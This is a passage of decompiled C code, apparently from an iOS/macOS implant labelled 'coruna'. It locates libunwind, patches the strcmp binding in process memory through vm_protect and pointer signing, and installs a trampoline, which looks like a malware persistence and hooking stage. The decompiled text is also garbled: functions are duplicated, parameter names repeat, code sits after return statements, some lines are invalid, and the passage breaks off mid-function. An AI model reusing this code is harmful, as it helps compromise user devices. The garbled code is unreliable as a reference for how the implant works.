  unsigned long scratch;
  unsigned long bootargs;
  
  if (val == (unsigned long *)0x0) {
    return 0xad001;
  }
  if (arg == 0) {
    return 0xad001;
  }
  if (flags_2 == (uint *)0x0) {
    return 0xad001;
  }
  port = *flags_2;
  if (id_2 <= port) {
    return 0xad001;
  }
  if (size == 0xff) {
    bootargs = 0;
    version = 0;
    *val = bootargs;
    return version;
  }
  u = size & 0xf;
  version = 0xad008;
  if (0xc < u) {
    return 0xad008;
  }
  ptr = (unsigned long *)(arg + (unsigned long)port);
  switch(u) {
  default:
    scratch = *ptr;
    port = port + 8;
    break;
  case 1:
    scratch = 0;
    bootargs = 0;
    version = coruna_read_uleb128(&scratch,&bootargs);
    err = false;
    bootargs = 0;
    goto code_r0x0001ce94;
  case 2:
    scratch = (unsigned long)(ushort)*ptr;
    port = port + 2;
    break;
  case 3:
    scratch = (unsigned long)(uint)*ptr;
    port = port + 4;
    break;
  case 5:
  case 6:
  case 7:
    return version;
code_r0x0001ce94:
    if ((int)version != 0) {
      return version;
    }
    port = 0;
    if (flags == 0) {
    port = size & 0x70;
    }
    if (port == 0x10) {
    size = scratch;
    if (!(bool)(u == 0 & (err ^ 1U))) {
    size = bootargs;
    }
    if (u != 0 && !err) {
    size = scratch;
    }
    bootargs = size + (long)ptr;
    }
    else {
    if (port != 0) {
    return 0xad008;
    }
    if (!err) {
    bootargs = scratch;
    }
    }
    version = 0;
    *val = bootargs;
    return version;
  }
  err = false;
  bootargs = 0;
  *flags_2 = port;
cleanup:
  port = 0;
  if (flags == 0) {
    port = size & 0x70;
  }
  if (port == 0x10) {
    size = scratch;
    if (!(bool)(u == 0 & (err ^ 1U))) {
      size = bootargs;
    }
    if (u != 0 && !err) {
      size = scratch;
    }
    bootargs = size + (long)ptr;
  }
  else {
    if (port != 0) {
      return 0xad008;
    }
    if (!err) {
      bootargs = scratch;
    }
  }
fail:
  version = 0;
  *val = bootargs;
done:
  return version;
}





uint64_t coruna_read_uleb128(unsigned long *arg,unsigned long *arg,long handle,uint *size,unsigned long val)
{
  byte err;
  byte status;
  unsigned long u;
  uint64_t size;
  unsigned long version;
  byte flags;
  uint port;
  unsigned long tag;
  unsigned long kind;
  
  size = 0xad001;
  if (((arg != (unsigned long *)0x0) && (handle != 0)) && (size != (uint *)0x0)) {
    port = *size;
    kind = (unsigned long)port;
    if (kind < arg) {
      version = 0;
      u = 0;
      flags = 1;
      do {
        tag = u;
        port = port + 1;
        status = *(byte *)(handle + kind);
        version = version | (long)(int)((status & 0x7f) << (unsigned long)((uint)tag & 0x1f));
        err = status >> 7;
        if (0x32 < tag) {
          err = flags;
        }
        *size = port;
      } while ((tag < 0x33) &&
              (kind = (unsigned long)port, u = tag + 7, flags = err,
              (status & 0x80) != 0 && kind < arg));
      if (0x32 < tag || err != 0) {
        return 0xad014;
      }
      size = 0;
      *arg = version;
      *val = tag + 7;
    }
  }
  return size;
}





uint64_t coruna_find_libunwind_image(uint64_t *val)
{
  kern_return_t lk1;
  int err;
  uint64_t u;
  unsigned long size;
  uint64_t *ptr;
  mach_msg_type_number_t scratch;
  long bootargs [2];
  uint32_t thread_attr;
  
  u = 0xad014;
  bootargs[0] = 0;
  bootargs[1] = 0;
  thread_attr = 0;
  scratch = 5;
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    lk1 = _task_info(*(task_name_t *)k_persist_mach_task_self_slot,0x11,(task_info_t)bootargs,
                       &scratch);
    if (lk1 == 0 && scratch == 5) {
      if (((bootargs[0] != 0) && (*(long *)(bootargs[0] + 8) != 0)) &&
         (size = (unsigned long)*(uint *)(bootargs[0] + 4), *(uint *)(bootargs[0] + 4) != 0)) {
        ptr = (uint64_t *)(*(long *)(bootargs[0] + 8) + 8);
        do {
          if (((char *)*ptr != (char *)0x0) &&
             (err = _strcmp((char *)*ptr,"/usr/lib/system/libunwind.dylib"), err == 0)) {
            *val = ptr[-1];
            return 0;
          }
          ptr = ptr + 3;
          size = size - 1;
        } while (size != 0);
        u = 0xad011;
      }
    }
    else {
      u = 0xad00b;
    }
  }
  return u;
}





uint64_t coruna_persist_via_persist_via_macho_open_image(long handle,uint64_t val,pthread_mutex_t *arg)
{
  uint64_t *ptr;
  unsigned long u;
  uint size;
  uint version;
  bool err;
  int err;
  uint64_t port;
  unsigned long tag;
  long handle;
  unsigned long kind;
  uint64_t type_id;
  long scratch;
  pthread_mutex_t *bootargs;
  char thread_attr;
  long host_info;
  uint64_t serial_buf;
  
  type_id = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    err = _pthread_mutex_lock(arg);
    if (err == 0) {
      if ((char)arg[1].__sig == '\0') {
        arg[1].__opaque[0xc] = '\x01';
        arg[1].__opaque[0] = '\0';
        arg[1].__opaque[1] = '\0';
        arg[1].__opaque[2] = '\0';
        arg[1].__opaque[3] = '\0';
        arg[1].__opaque[4] = '\0';
        arg[1].__opaque[5] = '\0';
        arg[1].__opaque[6] = '\0';
        arg[1].__opaque[7] = '\0';
        arg[1].__opaque[8] = '\0';
        arg[1].__opaque[9] = '\0';
        arg[1].__opaque[10] = '\0';
        arg[1].__opaque[0xb] = '\0';
        host_info = 0;
        port = coruna_persist_via_macho_open_image(handle,val,0,0,&host_info);
        if ((int)port == 0) {
          thread_attr = '\0';
          scratch = handle;
          bootargs = arg;
          if (host_info != 0) {
            if ((*(ushort *)(host_info + 0x1c0) >> 7 & 1) == 0) {
              type_id = coruna_persist_via_fixup_run_bindings(host_info,coruna_hook_strcmp,&scratch);
              err = (int)type_id;
joined_r0x0001d384:
              if (err == 0) {
                if (thread_attr == '\0') {
                  type_id = 0x18012;
                }
                else {
                  type_id = 0;
                  *(uint8_t *)&arg[1].__sig = 1;
                }
              }
            }
            else {
              handle = *(long *)(host_info + 8);
              tag = 0;
              do {
                if (*(long *)(handle + tag) == -0x55fdfc1e55fefc20) {
                  size = *(uint *)(handle + tag + 8);
                  if ((size & 0x7c000000) == 0x14000000) {
                    u = (unsigned long)(size & 0x1ffffff);
                    if ((size & 0x2000000) != 0) {
                      u = (unsigned long)size | 0xfffffffffe000000;
                    }
                    size = *(uint *)(handle + u * 4 + tag + 8);
                    if (((size & 0x9f000000) == 0x90000000) &&
                       (version = *(uint *)(handle + u * 4 + tag + 0xc),
                       (version & 0x7f000000) == 0x11000000)) {
                      kind = (unsigned long)(version >> 10) & 0xfff;
                      if ((version & 0xc00000) != 0) {
                        kind = kind << 0xc;
                      }
                      ptr = (uint64_t *)
                               ((handle + u * 4 + tag + 8 & 0xfffffffffffff000) +
                                (long)(int)(size >> 0x11 & 0x3000 | (size >> 5) << 0xe) + kind);
                      if (ptr == (uint64_t *)0x0) goto fail;
                      if (k_persist_strcmp_slot == (uint8_t *)*ptr) {
                        serial_buf = 0;
                        type_id = coruna_mach_vm_machine_attribute(arg,handle,&serial_buf);
                        port = serial_buf;
                        if ((int)type_id == 0) {
                          err = coruna_return_zero();
                          if (err != 0) {
                            port = coruna_pacia(port,ptr);
                          }
                          serial_buf = port;
                          type_id = coruna_vm_protect(ptr,port);
                        }
                      }
                      else {
                        type_id = 0;
                      }
                      thread_attr = '\x01';
                      err = (int)type_id;
                      goto joined_r0x0001d384;
                    }
                  }
                }
                err = tag < 0x7ffc;
                tag = tag + 4;
              } while (err);
              type_id = 0xad000;
            }
          }
fail:
          coruna_ctx_free(host_info);
          port = type_id;
        }
      }
      else {
        port = 0;
      }
      type_id = port;
      _pthread_mutex_unlock(arg);
    }
    else {
      type_id = 0x18013;
    }
  }
  return type_id;
}





uint32_t coruna_pthread_mutex_init(long handle,pthread_mutex_t *arg)
{
  int err;
  uint32_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    arg[1].__opaque[8] = '\0';
    arg[1].__opaque[9] = '\0';
    arg[1].__opaque[10] = '\0';
    arg[1].__opaque[0xb] = '\0';
    arg[1].__opaque[0xc] = '\0';
    arg[1].__opaque[0xd] = '\0';
    arg[1].__opaque[0xe] = '\0';
    arg[1].__opaque[0xf] = '\0';
    arg->__opaque[0x30] = '\0';
    arg->__opaque[0x31] = '\0';
    arg->__opaque[0x32] = '\0';
    arg->__opaque[0x33] = '\0';
    arg->__opaque[0x34] = '\0';
    arg->__opaque[0x35] = '\0';
    arg->__opaque[0x36] = '\0';
    arg->__opaque[0x37] = '\0';
    arg->__opaque[0x28] = '\0';
    arg->__opaque[0x29] = '\0';
    arg->__opaque[0x2a] = '\0';
    arg->__opaque[0x2b] = '\0';
    arg->__opaque[0x2c] = '\0';
    arg->__opaque[0x2d] = '\0';
    arg->__opaque[0x2e] = '\0';
    arg->__opaque[0x2f] = '\0';
    arg[1].__opaque[0] = '\0';
    arg[1].__opaque[1] = '\0';
    arg[1].__opaque[2] = '\0';
    arg[1].__opaque[3] = '\0';
    arg[1].__opaque[4] = '\0';
    arg[1].__opaque[5] = '\0';
    arg[1].__opaque[6] = '\0';
    arg[1].__opaque[7] = '\0';
    arg[1].__sig = 0;
    arg->__opaque[0x10] = '\0';
    arg->__opaque[0x11] = '\0';
    arg->__opaque[0x12] = '\0';
    arg->__opaque[0x13] = '\0';
    arg->__opaque[0x14] = '\0';
    arg->__opaque[0x15] = '\0';
    arg->__opaque[0x16] = '\0';
    arg->__opaque[0x17] = '\0';
    arg->__opaque[8] = '\0';
    arg->__opaque[9] = '\0';
    arg->__opaque[10] = '\0';
    arg->__opaque[0xb] = '\0';
    arg->__opaque[0xc] = '\0';
    arg->__opaque[0xd] = '\0';
    arg->__opaque[0xe] = '\0';
    arg->__opaque[0xf] = '\0';
    arg->__opaque[0x20] = '\0';
    arg->__opaque[0x21] = '\0';
    arg->__opaque[0x22] = '\0';
    arg->__opaque[0x23] = '\0';
    arg->__opaque[0x24] = '\0';
    arg->__opaque[0x25] = '\0';
    arg->__opaque[0x26] = '\0';
    arg->__opaque[0x27] = '\0';
    arg->__opaque[0x18] = '\0';
    arg->__opaque[0x19] = '\0';
    arg->__opaque[0x1a] = '\0';
    arg->__opaque[0x1b] = '\0';
    arg->__opaque[0x1c] = '\0';
    arg->__opaque[0x1d] = '\0';
    arg->__opaque[0x1e] = '\0';
    arg->__opaque[0x1f] = '\0';
    arg->__opaque[0] = '\0';
    arg->__opaque[1] = '\0';
    arg->__opaque[2] = '\0';
    arg->__opaque[3] = '\0';
    arg->__opaque[4] = '\0';
    arg->__opaque[5] = '\0';
    arg->__opaque[6] = '\0';
    arg->__opaque[7] = '\0';
    arg->__sig = 0;
    err = _pthread_mutex_init(arg,(pthread_mutexattr_t *)0x0);
    u = 0;
    if (err != 0) {
      u = 0x18013;
    }
  }
  return u;
}





uint64_t coruna_loader_mutex_lock(long handle,pthread_mutex_t *arg)
{
  int err;
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    err = _pthread_mutex_lock(arg);
    if (err == 0) {
      if (((char)arg[1].__sig == '\0') || (arg[1].__opaque[0xc] != '\0')) {
        u = 0;
      }
      else if (*(long *)arg[1].__opaque == 0) {
        u = 0;
        arg[1].__opaque[0xc] = '\x01';
      }
      else {
        u = coruna_macho_get_slide(handle,*(uint32_t *)k_persist_mach_task_self_slot,
                             *(long *)arg[1].__opaque,*(uint32_t *)(arg[1].__opaque + 8));
      }
      _pthread_mutex_unlock(arg);
    }
    else {
      u = 0x18013;
    }
  }
  return u;
}





uint64_t coruna_hook_strcmp(uint64_t val,mach_vm_address_t *arg,uint64_t *id_2)
{
  int err;
  kern_return_t lk2;
  uint64_t u;
  uint64_t scratch;
  mach_vm_size_t bootargs;
  uint8_t *thread_attr;
  
  if (id_2 == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (arg != (mach_vm_address_t *)0x0) {
    if ((char *)arg[1] == (char *)0x0) {
      return 0;
    }
    err = _strcmp((char *)arg[1],"_strcmp");
    if (err == 0) {
      bootargs = 0;
      thread_attr = (uint8_t *)0x0;
      lk2 = _mach_vm_read_overwrite
                        (*(vm_map_t *)k_persist_mach_task_self_slot,*arg,8,
                         (mach_vm_address_t)&thread_attr,&bootargs);
      if (lk2 != 0 || bootargs != 8) {
        return 0x1800e;
      }
      if (thread_attr == k_persist_strcmp_slot) {
        scratch = 0;
        u = coruna_mach_vm_machine_attribute(id_2[1],*id_2,&scratch);
        if ((int)u == 0) {
          u = coruna_vm_protect(*arg,scratch);
        }
      }
      else {
        u = 0;
      }
      *(uint8_t *)(id_2 + 2) = 1;
      return u;
    }
  }
  return 0;
}





uint64_t coruna_mach_vm_machine_attribute(long handle,long addr_2,mach_vm_address_t *arg)
{
  uint8_t *ptr;
  int err;
  mach_vm_address_t address;
  uint64_t u;
  vm_machine_attribute_val_t scratch;
  uint8_t bootargs;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (mach_vm_address_t *)0x0)) {
    if (*(mach_vm_address_t *)(handle + 0x48) == 0) {
      if (addr_2 != 0) {
        u = 0x18011;
        address = _mmap(0,0x38,3,&k_persist_mmap_anon_fd,0xffffffff,0);
        if (address != 0xffffffffffffffff) {
          coruna_persist_trampoline_00010010(address,coruna_persist_residual_43,0x38);
          *(uint8_t **)(address + 0x30) = k_persist_strcmp_slot;
          ptr = k_persist_mach_task_self_slot;
          bootargs = 0;
          err = coruna_mlock_range(addr_2,*(uint32_t *)k_persist_mach_task_self_slot,address,0x38,5,
                               &bootargs);
          if (err == 0) {
            scratch = 6;
            _mach_vm_machine_attribute(*(vm_map_t *)ptr,address,0x38,1,&scratch);
            u = 0;
            *(mach_vm_address_t *)(handle + 0x48) = address;
            *(uint32_t *)(handle + 0x50) = 0x38;
            *(uint8_t *)(handle + 0x54) = bootargs;
            *arg = address;
          }
          else {
            _munmap(address,0x38);
          }
        }
      }
    }
    else {
      u = 0;
      *arg = *(mach_vm_address_t *)(handle + 0x48);
    }
  }
  return u;
}





unsigned long coruna_vm_protect(uint64_t *arg,uint64_t val)

{
  uint8_t *data;
  uint size;
  uint version;
  unsigned long type_id;
  uint8_t cache_41;
  uint8_t cache_42;
  vm_prot_t cache_92;
  
  data = k_persist_mach_task_self_slot;
  if (arg != (uint64_t *)0x0) {
    type_id = coruna_vm_region_recurse(*(uint32_t *)k_persist_mach_task_self_slot,arg,8,&cache_92,&cache_42
                         ,&cache_41);
    if ((int)type_id == 0) {
      if (((byte)cache_92 >> 1 & 1) == 0) {
        size = _vm_protect(*(vm_map_t *)data,(vm_address_t)arg,8,0,3);
        if (size == 0) {
          *arg = val;
          version = _vm_protect(*(vm_map_t *)data,(vm_address_t)arg,8,0,cache_92);
          size = 0;
          if (version != 0) {
            size = version | 0x80000000;
          }
          type_id = (unsigned long)size;
        }
        else {
          type_id = (unsigned long)(size | 0x80000000);
        }
      }
      else {
        type_id = 0;
        *arg = val;
      }
    }
    return type_id;
  }
  return 0xad001;
}





unsigned long coruna_hook_libunwind_bss(long arg,uint64_t val,pthread_mutex_t *n)

{
  mach_vm_address_t *address;
  uint8_t *data;
  int j;
  uint version;
  char *data;
  unsigned long port;
  byte *entry_22;
  unsigned long kind;
  mach_vm_address_t address_00;
  uint8_t cache_105;
  unsigned long cache_20;
  unsigned long block_ctx;
  
  kind = 0xad00b;
  if (arg == 0) {
    return 0xad001;
  }
  if (n == (pthread_mutex_t *)0x0) {
    return 0xad001;
  }
  j = _pthread_mutex_lock(n);
  if (j != 0) {
    return 0xad00b;
  }
  if ((char)n[1].__sig != '\0') {
    kind = 0;
    _pthread_mutex_unlock(n);
    return kind;
  }
  n[1].__opaque[0xc] = '\x01';
  n[1].__opaque[0] = '\0';
  n[1].__opaque[1] = '\0';
  n[1].__opaque[2] = '\0';
  n[1].__opaque[3] = '\0';
  n[1].__opaque[4] = '\0';
  n[1].__opaque[5] = '\0';
  n[1].__opaque[6] = '\0';
  n[1].__opaque[7] = '\0';
  n[1].__opaque[8] = '\0';
  n[1].__opaque[9] = '\0';
  n[1].__opaque[10] = '\0';
  n[1].__opaque[0xb] = '\0';
  block_ctx = 0;
  data = _getsectdatafromFramework("libunwind.dylib","__DATA","__bss",&block_ctx);
  _pthread_mutex_unlock(n);
  return kind;
  entry_22 = (byte *)(data + 1);
  if (*entry_22 < 3) {
    port = __NSGetMachExecuteHeader();
    _pthread_mutex_unlock(n);
    return kind;
    address_00 = *(mach_vm_address_t *)n[1].__opaque;
    if (address_00 == 0) {
      block_ctx = (unsigned long)entry_22 & 0xfffffffffffff000;
      cache_20 = port;
      address_00 = _mmap(0,0x78,3,&k_persist_mmap_anon_fd,0xffffffff,0);
      _pthread_mutex_unlock(n);
      return kind;
    }
    data = k_persist_mach_task_self_slot;
    address = (mach_vm_address_t *)(data + 8);
    kind = 0xad001;
    _pthread_mutex_unlock(n);
    return kind;
  }
  *(uint8_t *)&n[1].__sig = 1;
  kind = 0;
load_ok_42:
  _pthread_mutex_unlock(n);
  return kind;
}





uint32_t coruna_pthread_mutex_init(long handle,pthread_mutex_t *arg)
{
  int err;
  uint32_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    arg[1].__opaque[8] = '\0';
    arg[1].__opaque[9] = '\0';
    arg[1].__opaque[10] = '\0';
    arg[1].__opaque[0xb] = '\0';
    arg[1].__opaque[0xc] = '\0';
    arg[1].__opaque[0xd] = '\0';
    arg[1].__opaque[0xe] = '\0';
    arg[1].__opaque[0xf] = '\0';
    arg->__opaque[0x30] = '\0';
    arg->__opaque[0x31] = '\0';
    arg->__opaque[0x32] = '\0';
    arg->__opaque[0x33] = '\0';
    arg->__opaque[0x34] = '\0';
    arg->__opaque[0x35] = '\0';
    arg->__opaque[0x36] = '\0';
    arg->__opaque[0x37] = '\0';
    arg->__opaque[0x28] = '\0';
    arg->__opaque[0x29] = '\0';
    arg->__opaque[0x2a] = '\0';
    arg->__opaque[0x2b] = '\0';
    arg->__opaque[0x2c] = '\0';
    arg->__opaque[0x2d] = '\0';
    arg->__opaque[0x2e] = '\0';
    arg->__opaque[0x2f] = '\0';
    arg[1].__opaque[0] = '\0';
    arg[1].__opaque[1] = '\0';
    arg[1].__opaque[2] = '\0';
    arg[1].__opaque[3] = '\0';
    arg[1].__opaque[4] = '\0';
    arg[1].__opaque[5] = '\0';
    arg[1].__opaque[6] = '\0';
    arg[1].__opaque[7] = '\0';
    arg[1].__sig = 0;
    arg->__opaque[0x10] = '\0';
    arg->__opaque[0x11] = '\0';
    arg->__opaque[0x12] = '\0';
    arg->__opaque[0x13] = '\0';
    arg->__opaque[0x14] = '\0';
    arg->__opaque[0x15] = '\0';
    arg->__opaque[0x16] = '\0';
    arg->__opaque[0x17] = '\0';
    arg->__opaque[8] = '\0';
    arg->__opaque[9] = '\0';
    arg->__opaque[10] = '\0';
    arg->__opaque[0xb] = '\0';
    arg->__opaque[0xc] = '\0';
    arg->__opaque[0xd] = '\0';
    arg->__opaque[0xe] = '\0';
    arg->__opaque[0xf] = '\0';
    arg->__opaque[0x20] = '\0';
    arg->__opaque[0x21] = '\0';
    arg->__opaque[0x22] = '\0';
    arg->__opaque[0x23] = '\0';
    arg->__opaque[0x24] = '\0';
    arg->__opaque[0x25] = '\0';
    arg->__opaque[0x26] = '\0';
    arg->__opaque[0x27] = '\0';
    arg->__opaque[0x18] = '\0';
    arg->__opaque[0x19] = '\0';
    arg->__opaque[0x1a] = '\0';
    arg->__opaque[0x1b] = '\0';
    arg->__opaque[0x1c] = '\0';
    arg->__opaque[0x1d] = '\0';
    arg->__opaque[0x1e] = '\0';
    arg->__opaque[0x1f] = '\0';
    arg->__opaque[0] = '\0';
    arg->__opaque[1] = '\0';
    arg->__opaque[2] = '\0';
    arg->__opaque[3] = '\0';
    arg->__opaque[4] = '\0';
    arg->__opaque[5] = '\0';
    arg->__opaque[6] = '\0';
    arg->__opaque[7] = '\0';
    arg->__sig = 0;
    err = _pthread_mutex_init(arg,(pthread_mutexattr_t *)0x0);
    u = 0;
    if (err != 0) {
      u = 0xad00b;
    }
  }
  return u;
}





uint64_t coruna_loader_mutex_lock(long handle,pthread_mutex_t *arg)
{
  int err;
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    err = _pthread_mutex_lock(arg);
    if (err == 0) {
      if (((char)arg[1].__sig == '\0') || (arg[1].__opaque[0xc] != '\0')) {
        u = 0;
      }
      else if (*(long *)arg[1].__opaque == 0) {
        u = 0;
        arg[1].__opaque[0xc] = '\x01';
      }
      else {
        u = coruna_macho_get_slide(handle,*(uint32_t *)k_persist_mach_task_self_slot,
                             *(long *)arg[1].__opaque,*(uint32_t *)(arg[1].__opaque + 8));
      }
      _pthread_mutex_unlock(arg);
    }
    else {
      u = 0x18013;
    }
  }
  return u;
}





uint64_t coruna_rwlock_iface_create(uint64_t *val)
{
  uint64_t u;
  uint32_t *ptr;
  uint64_t scratch;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    scratch = 0;
    u = coruna_rwlock_init(&scratch);
    if ((int)u == 0) {
      ptr = _calloc(1,0x38);
      if (ptr == (uint32_t *)0x0) {
        coruna_rwlock_destroy(scratch);
        u = 0xad009;
      }
      else {
        u = 0;
        *ptr = 0x10001;
        *(uint64_t *)(ptr + 2) = scratch;
        ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_pthread_rwlock_unlock;
        ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_pthread_rwlock_rdlock;
        ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_pthread_rwlock_rdlock;
        ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_pthread_rwlock_rdlock;
        ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_pthread_rwlock_unlock;
        *val = ptr;
      }
    }
  }
  return u;
}





uint64_t coruna_persist_via_ctx_free(long *handle,int *flags,unsigned long arg)
{
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = 0xad001;
  if (((handle != (long *)0x0) && (flags != (int *)0x0)) && ((uint)arg != 0)) {
    if ((((uint)arg < 9) || (*flags != -0xff24111)) ||
       ((flags[1] == 0 || ((arg & 0xffffffff) <= ((unsigned long)(uint)flags[1] << 4 | 8))))) {
      u = 0x700b;
    }
    else {
      u = coruna_rwlock_iface_create(&scratch);
      if ((int)u == 0) {
        u = (**(void (**)(scratch + 0x10))(scratch,flags,arg);
        if ((int)u == 0) {
          *handle = scratch;
        }
        else {
          coruna_ctx_free();
        }
      }
    }
  }
  return u;
}





uint64_t coruna_ctx_free(uint64_t *val)
{
  uint64_t u;
  
  if ((val == (uint64_t *)0x0) || (val[1] == 0)) {
    u = 0xad001;
  }
  else {
    u = coruna_rwlock_destroy();
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[6] = 0;
    _free(val);
  }
  return u;
}





uint64_t coruna_pthread_rwlock_unlock(long handle,long addr_2,uint64_t val)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && (int)val != 0)) {
    err = _pthread_rwlock_wrlock(ptr);
    if (err == 0) {
      u = coruna_ipc_memcmp(ptr,2,addr_2,val);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_pthread_rwlock_rdlock(long handle,int flags,long addr_2,long off_3)
{
  int err;
  char *ptr;
  unsigned long u;
  pthread_rwlock_t *ptr;
  uint64_t size;
  
  size = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     ((ptr != (pthread_rwlock_t *)0x0 && flags != 0) && addr_2 != 0) && off_3 != 0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      u = (unsigned long)*(uint *)(ptr[1].__opaque + 0x18);
      if (*(uint *)(ptr[1].__opaque + 0x18) != 0) {
        ptr = ptr[1].__opaque;
        do {
          ptr = ptr + 0x20;
          if (*(int *)ptr == flags) {
            size = coruna_ipc_resolve_entry(ptr,ptr,addr_2,off_3);
            goto fail;
          }
          u = u - 1;
        } while (u != 0);
      }
      size = 0x7003;
fail:
      _pthread_rwlock_unlock(ptr);
    }
    else {
      size = 0xad020;
    }
  }
  return size;
}





uint64_t coruna_pthread_rwlock_rdlock(long handle,long addr_2,long off_3)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && off_3 != 0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      u = coruna_ipc_serialize(ptr,addr_2,off_3);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_pthread_rwlock_rdlock(long handle,void (*val,uint64_t val)
{
  uint32_t u;
  int err;
  pthread_rwlock_t *ptr;
  uint64_t size;
  char *ptr;
  unsigned long version;
  uint32_t scratch;
  uint64_t bootargs;
  
  size = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     ptr != (pthread_rwlock_t *)0x0 && arg != (void (*)0x0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      ptr = ptr[1].__opaque;
      version = 0xffffffffffffffff;
      do {
        ptr = ptr + 0x20;
        version = version + 1;
        if (*(uint *)(ptr[1].__opaque + 0x18) <= version) {
          size = 0;
          break;
        }
        u = *(uint32_t *)ptr;
        bootargs = 0;
        scratch = 0;
        size = coruna_ipc_resolve_entry(ptr,ptr,&bootargs,&scratch);
        if ((int)size != 0) break;
        size = (*arg)(handle,u,bootargs,scratch,val);
      } while ((int)size == 0);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      size = 0xad020;
    }
  }
  return size;
}





uint64_t coruna_pthread_rwlock_unlock(long handle,uint64_t val,long addr_2,uint size)
{
  int err;
  void *ptr;
  unsigned long u;
  pthread_rwlock_t *ptr;
  uint64_t size;
  void *buf;
  char *ptr;
  uint scratch;
  void *bootargs;
  
  size = 0xad001;
  if (handle != 0) {
    ptr = *(pthread_rwlock_t **)(handle + 8);
    if (((ptr != (pthread_rwlock_t *)0x0 && (uint)val != 0) && addr_2 != 0) && size != 0)
    {
      err = _pthread_rwlock_wrlock(ptr);
      if (err == 0) {
        u = (unsigned long)*(uint *)(ptr[1].__opaque + 0x18);
        if (*(uint *)(ptr[1].__opaque + 0x18) != 0) {
          ptr = ptr[1].__opaque + 0x38;
          do {
            if (*(uint *)(ptr + -0x18) == (uint)val) {
              ptr = _malloc((unsigned long)size);
              if (ptr == (void *)0x0) {
                size = 0xad009;
              }
              else {
                coruna_persist_trampoline_00010010(ptr,addr_2,(unsigned long)size);
                if (ptr[-0x10] == '\x03') {
                  buf = *(void **)(ptr + -8);
                  _bzero(buf,(unsigned long)*(uint *)ptr);
                  _free(buf);
                }
                else if (ptr[-0x10] == '\x01') {
                  _bzero((void *)(*(long *)(ptr[1].__opaque + 8) + *(long *)(ptr + -8)),
                         (unsigned long)*(uint *)ptr);
                }
                ptr[-0x10] = '\x03';
                *(void **)(ptr + -8) = ptr;
                *(uint *)ptr = size;
                if (ptr[1].__sig == 0) {
                  size = 0;
                }
                else {
                  bootargs = (void *)0x0;
                  scratch = 0;
                  size = coruna_ipc_serialize(ptr,&bootargs,&scratch);
                  if ((int)size == 0) {
                    size = (*(void (*)ptr[1].__sig)
                                      (val,bootargs,scratch,*(uint64_t *)ptr[1].__opaque);
                    _bzero(bootargs,(unsigned long)scratch);
                    _free(bootargs);
                  }
                }
              }
              goto fail;
            }
            ptr = ptr + 0x20;
            u = u - 1;
          } while (u != 0);
        }
        size = 0x7003;
fail:
        _pthread_rwlock_unlock(ptr);
      }
      else {
        size = 0xad020;
      }
    }
  }
  return size;
}





uint64_t coruna_ipc_resolve_entry(long handle,long addr_2,long *off_3,uint32_t *size)
{
  char err;
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != (long *)0x0)) &&
     (size != (uint32_t *)0x0)) {
    err = *(char *)(addr_2 + 8);
    if ((err == '\x03') || (err == '\x02')) {
      handle = *(long *)(addr_2 + 0x10);
      if (handle == 0) {
        return 0xad014;
      }
    }
    else {
      if (err != '\x01') {
        return 0x700c;
      }
      if (*(long *)(handle + 0xd8) == 0) {
        return 0xad014;
      }
      handle = *(long *)(handle + 0xd8) + *(long *)(addr_2 + 0x10);
    }
    u = 0;
    *off_3 = handle;
    *size = *(uint32_t *)(addr_2 + 0x18);
  }
  return u;
}





unsigned long coruna_ipc_memcmp(long arg,int val,int *n,uint m)

{
  uint u;
  int *idx;
  int count;
  uint type_id;
  unsigned long port;
  unsigned long tag;
  long ctx_val;
  unsigned long type_id_8;
  int *j;
  uint *entry_10;
  unsigned long type_id_13;
  uint *entry_11;
  uint action;
  void *block_ctx;
  
  if (((arg == 0) || (n == (int *)0x0)) || (m == 0)) {
load_ok_44:
    port = 0xad001;
  }
  else {
    if ((7 < m) && (*n == -0xff24111)) {
      type_id = n[1];
      if ((type_id != 0) && (port = (unsigned long)type_id << 4 | 8, port <= m)) {
        count = *(int *)(arg + 0xe8);
        if ((uint)(*(int *)(arg + 0xe4) - count) < type_id) {
          return 0xad009;
        }
        type_id_8 = 0;
        do {
          idx = n + type_id_8 * 4 + 2;
          if (*idx == 0) {
            return 0x700c;
          }
          entry_11 = (uint *)(idx + 2);
          type_id = *entry_11;
          if (type_id < (uint)port) {
            return 0x700c;
          }
